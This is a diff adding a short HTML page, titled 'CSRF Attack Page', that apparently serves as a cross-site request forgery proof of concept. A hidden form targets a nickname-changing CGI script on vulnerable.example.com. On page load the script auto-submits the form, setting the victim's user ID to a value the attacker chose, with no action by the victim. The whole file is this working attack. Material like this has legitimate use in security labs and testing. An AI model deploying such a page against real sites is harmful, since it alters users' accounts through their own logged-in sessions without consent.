@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>CSRF Attack Page</h1>
+    <p>This page will attempt to log in and change the user ID on vulnerable.example.com</p>
+    
+    <!-- Form to change user ID -->
+    <form id="csrfForm" method="POST" action="http://vulnerable.example.com/cgi-bin/change_nickname.cgi">
+        <input type="hidden" name="action" value="updateUserID">
+        <input type="hidden" name="newUserID" value="in111123">
+    </form>
+    
+    <script>
+            window.onload = function() {
+            document.getElementById("csrfForm").submit();
+        };
+    
+    </script>
+</body>
+</html>
